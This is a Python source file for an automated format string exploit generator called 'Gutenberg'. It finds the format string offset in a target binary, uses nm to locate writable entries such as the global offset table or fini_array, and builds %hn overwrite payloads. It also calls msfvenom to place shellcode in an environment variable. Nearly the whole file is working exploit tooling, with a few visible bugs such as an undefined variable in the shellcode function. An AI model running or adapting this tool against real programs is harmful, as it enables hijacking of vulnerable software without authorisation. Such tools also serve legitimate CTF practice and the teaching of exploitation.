#!/usr/bin/env python3
# coding: utf-8
#
# Made by the Rapace Diabolique
#


from sys import stdout
from os import access, X_OK, mkfifo, environ
from os.path import realpath, isfile
from io import StringIO
from math import log
from signal import signal, SIGINT
from argparse import ArgumentParser
from subprocess import run, PIPE
from multiprocessing import Process


#
# Version
#
gutenbreg_major = 0
gutenbreg_minor = 1
gutenbreg_bug = 0


#
# Format
#
FMT_CHECK = "x-"
FMT_WRITE = "hn"


#
#  Entries
#
entries = [
    b'__do_global_dtors_aux_fini_array_entry',
    b'__DTOR_END__',
    b'_GLOBAL_OFFSET_TABLE_',
    b'__atexit'
]


#
# Misc
#
MAX_ITER = 1000
FIFO = "/tmp/gutenberg"
silent = False


def print_silent(*objects, sep=' ', end='\n', file=stdout, flush=False):
    if silent:
        print(*objects, sep=sep, end=end, file=file, flush=flush)
    pass


def generate_payload(where_to_write, offset, what_to_write=0x00180010, fmt=FMT_WRITE, chr_padd=0):
    nba2hx = lambda x: ''.join(map(chr, (x & 255, (x >> 8) & 255, (x >> 16) & 255, x >> 24)))
    pw1 = (what_to_write & ((255 << 8) + 255)) - 8
    _pw = what_to_write >> 16
    pw2 = 65536 * (_pw <= pw1) + _pw - pw1 - 8
    payload = "{:s}{:s}%{:05d}x%{:d}${:s}%{:05d}x%{:d}${:s}".format(nba2hx(where_to_write),
                                                                nba2hx(where_to_write + 2),
                                                                pw1, offset, fmt,
                                                                pw2, offset + 1, fmt) + " " * chr_padd
    return payload.replace('\0', '\\0')


def detect_entries_table(binary):
    r = run(["nm", realpath(binary)], stdout=PIPE).stdout
    if r == b'':
        return 0
    else:
        t = [ _ for _  in r.split(b'\n') if any(__ in _ for __ in entries) ]
        return int(t[0][:8], 16)


def exec_cmd_stdin(binary, cmd):
    def _write():
        print(cmd, file=open(FIFO, 'w'))
        pass
    Process(target=_write).start()
    r = run([realpath(binary)], stdin=open(FIFO, 'r'), stdout=PIPE)
    return r.stdout


def exec_cmd_args(binary, cmd):
    r = run([realpath(binary), cmd], stdout=PIPE)
    return r.stdout


def check(binary):
    if not access(binary, X_OK):
        print_silent("[-] Binary can't be executed")
        exit(1)
    else:
        print_silent("[+] Binary is executable")
    try:
        if not isfile(realpath(FIFO)):
            mkfifo(FIFO)
    except OSError as oe:
        print_silent("[-] " + oe)
        exit(1)
    pass


def analyze(binary):
    chr_padd = 0
    for i in range(MAX_ITER):
        payload = generate_payload(0x41414141, i, fmt=FMT_CHECK, chr_padd=chr_padd)
        r = exec_cmd(binary, payload)
        if b'4141' in r:
            if r.split(b'-')[0][16:] != b'41414141':
                i = 0
                chr_padd += 1
            else:
                print_silent("[+] Offset is {:d} with padding of {:d}".format(i, chr_padd))
                break

    where_to_write = detect_entries_table(binary)
    if where_to_write == 0: # debug
        print("[-] No entries to rewrite")
        exit(1)
    else:
        print_silent("[+] We need to write in 0x{:08x}".format(where_to_write))
    return generate_payload(where_to_write, i, fmt=FMT_WRITE, chr_padd=chr_padd)


def exploit(binary, payload):
    print_silent("[+] Payload ", end='')
    print(payload)
    pass


def generate_shellcode():
    shellcode = run(["msfvenom", cmd], stdout=PIPE)
    print(shellcode)
    return shellcode


def main():
    parser = ArgumentParser(description = "Detect and analyse format string exploit")
    parser.add_argument("binary", metavar="binary", help="The binary to analyse")
    parser.add_argument("method", choices=["args", "stdin"], help="Use specific method") 
    parser.add_argument("-s", "--silent", action="store_false", help="Only print final payload")
    parser.add_argument("-v", "--version", action="store_true", help="Print version number")
    parser.add_argument("-e", "--environ", default="SHELLCODE", help="Print version number")
    args = parser.parse_args()

    if (args.version):
        print_silent("[+] Gutenberg {}.{}.{}".format(gutenbreg_major, gutenbreg_minor, gutenbreg_bug))
        print_silent("[+] Made by the Rapace Diabolique\n")

    global silent, exec_cmd
    silent = args.silent
    exec_cmd = exec_cmd_args if args.method == "args" else exec_cmd_stdin

    signal(SIGINT, signal_handler)
    if not args.environ in environ:
        environ[args.environ] = generate_shellcode()

    print_silent("[+] Checking file")
    check(args.binary)
    print_silent("[+] Analyzing file")
    payload = analyze(args.binary)
    print_silent("[+] Running exploit")
    exploit(args.binary, payload)
    print_silent("[+] Exiting")


def signal_handler(signal, frame):
    print_silent("[-] Search cancelled")
    exit(0)


if __name__ == '__main__':
    main()
